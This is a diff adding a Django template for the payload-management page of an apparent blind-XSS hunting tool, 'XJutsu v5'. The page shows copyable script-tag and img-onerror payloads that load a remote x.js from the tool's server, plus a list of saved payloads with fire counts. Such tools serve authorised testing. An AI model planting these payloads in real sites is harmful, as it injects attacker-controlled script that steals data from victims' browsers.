@@ -1,0 +1,104 @@
+{% extends 'hunter/base.html' %}
+
+{% block title %}Payloads - XJutsu v5{% endblock %}
+
+{% block content %}
+<div class="space-y-6">
+    <!-- Header -->
+    <div class="flex justify-between items-center">
+        <div>
+            <h1 class="text-3xl font-bold">Payloads</h1>
+            <p class="text-gray-500 mt-1">Manage your XSS payloads</p>
+        </div>
+        <a href="{% url 'payload_create' %}" class="btn-primary px-6 py-2 rounded-lg font-semibold transition">
+            <i class="fas fa-plus mr-2"></i>New Payload
+        </a>
+    </div>
+    
+    <!-- Quick Payload -->
+    <div class="card rounded-xl p-6">
+        <h2 class="text-xl font-bold mb-4">
+            <i class="fas fa-bolt text-yellow-500 mr-2"></i>Universal Payload
+        </h2>
+        <p class="text-gray-500 mb-4">Works without a specific payload ID - captures go to your default collection:</p>
+        
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+            <div>
+                <p class="text-sm text-gray-500 mb-2">Script Tag</p>
+                <div class="bg-dark-900 rounded-lg p-3 relative">
+                    <code class="text-green-400 text-sm break-all">&lt;script src="{{ server_url }}/x.js"&gt;&lt;/script&gt;</code>
+                    <button onclick="copyCode(this)" class="absolute top-2 right-2 text-gray-400 hover:text-white">
+                        <i class="fas fa-copy"></i>
+                    </button>
+                </div>
+            </div>
+            <div>
+                <p class="text-sm text-gray-500 mb-2">Image Tag</p>
+                <div class="bg-dark-900 rounded-lg p-3 relative">
+                    <code class="text-blue-400 text-sm break-all">&lt;img src=x onerror="s=document.createElement('script');s.src='{{ server_url }}/x.js';document.head.appendChild(s)"&gt;</code>
+                    <button onclick="copyCode(this)" class="absolute top-2 right-2 text-gray-400 hover:text-white">
+                        <i class="fas fa-copy"></i>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Payloads List -->
+    <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
+        {% for payload in payloads %}
+        <div class="card rounded-xl p-6 hover:border-primary/50 transition">
+            <div class="flex justify-between items-start mb-4">
+                <div>
+                    <h3 class="text-lg font-bold">{{ payload.name }}</h3>
+                    <p class="text-gray-500 text-sm">{{ payload.short_id }}</p>
+                </div>
+                <span class="{% if payload.is_active %}text-green-500{% else %}text-gray-500{% endif %}">
+                    <i class="fas fa-circle text-xs"></i>
+                </span>
+            </div>
+            
+            {% if payload.description %}
+            <p class="text-gray-400 text-sm mb-4">{{ payload.description }}</p>
+            {% endif %}
+            
+            <div class="flex items-center justify-between text-sm text-gray-500 mb-4">
+                <span><i class="fas fa-bullseye mr-1"></i>{{ payload.fire_count }} fires</span>
+                <span>{{ payload.created_at|timesince }} ago</span>
+            </div>
+            
+            <div class="flex space-x-2">
+                <a href="{% url 'payload_detail' payload.id %}" class="flex-1 text-center py-2 bg-primary/20 text-primary rounded-lg hover:bg-primary/30 transition">
+                    <i class="fas fa-eye mr-1"></i>View
+                </a>
+                <form method="post" action="{% url 'payload_delete' payload.id %}" onsubmit="return confirm('Delete this payload?')">
+                    {% csrf_token %}
+                    <button type="submit" class="px-4 py-2 bg-red-500/20 text-red-500 rounded-lg hover:bg-red-500/30 transition">
+                        <i class="fas fa-trash"></i>
+                    </button>
+                </form>
+            </div>
+        </div>
+        {% empty %}
+        <div class="col-span-full card rounded-xl p-12 text-center">
+            <i class="fas fa-code text-4xl text-gray-600 mb-4"></i>
+            <p class="text-gray-500 mb-4">No custom payloads yet</p>
+            <a href="{% url 'payload_create' %}" class="btn-primary px-6 py-2 rounded-lg inline-block">
+                <i class="fas fa-plus mr-2"></i>Create Payload
+            </a>
+        </div>
+        {% endfor %}
+    </div>
+</div>
+
+<script>
+function copyCode(btn) {
+    const code = btn.previousElementSibling.textContent;
+    navigator.clipboard.writeText(code);
+    btn.innerHTML = '<i class="fas fa-check text-green-500"></i>';
+    setTimeout(() => {
+        btn.innerHTML = '<i class="fas fa-copy"></i>';
+    }, 2000);
+}
+</script>
+{% endblock %}
